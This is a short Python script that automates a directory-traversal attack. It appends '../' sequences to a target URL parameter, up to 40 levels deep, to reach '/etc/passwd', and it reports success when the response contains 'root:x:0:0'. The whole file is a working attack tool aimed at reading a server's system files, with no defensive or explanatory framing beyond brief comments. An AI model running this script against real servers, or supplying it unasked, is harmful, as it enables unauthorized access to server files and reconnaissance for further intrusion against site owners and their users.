import requests
import sys

urlsys = sys.argv[1]
dotslashString = "../"
etcPasswd = "etc/passwd"

def checkContent(content, dotslash, url):
	newUrl = url
	if (content.find("root:x:0:0") == -1):	#just a common string in etc/passwd files
		#print("Not found.")
		newUrl = urlsys + dotslashString * dotslash + etcPasswd
	else:
		print(f"Found! Payload URL: {url}")
		exit(0)
	return newUrl

try:
	url = f"{urlsys}/etc/passwd"	#first check looks like this, where urlsys ends in the "/example?test=", can also
	dotslash = 0					#just accept the first test will look weird if need to input like ?test=/thing/NOW/../../etc/passwd
	while (dotslash < 40):
		#print(url)					#for debugging, can print url.
		r = requests.get(url)
		if (r.status_code != 200):
			print(f"Response code {r.status_code} received on URL {url}!")
			dotslash += 1
			continue
		else:
			content = r.content.decode()
			dotslash += 1
			url = checkContent(content, dotslash, url)
	print("Dot slash did not succeed in finding /etc/passwd.")
except Exception as e:
	print(e)
	exit(0)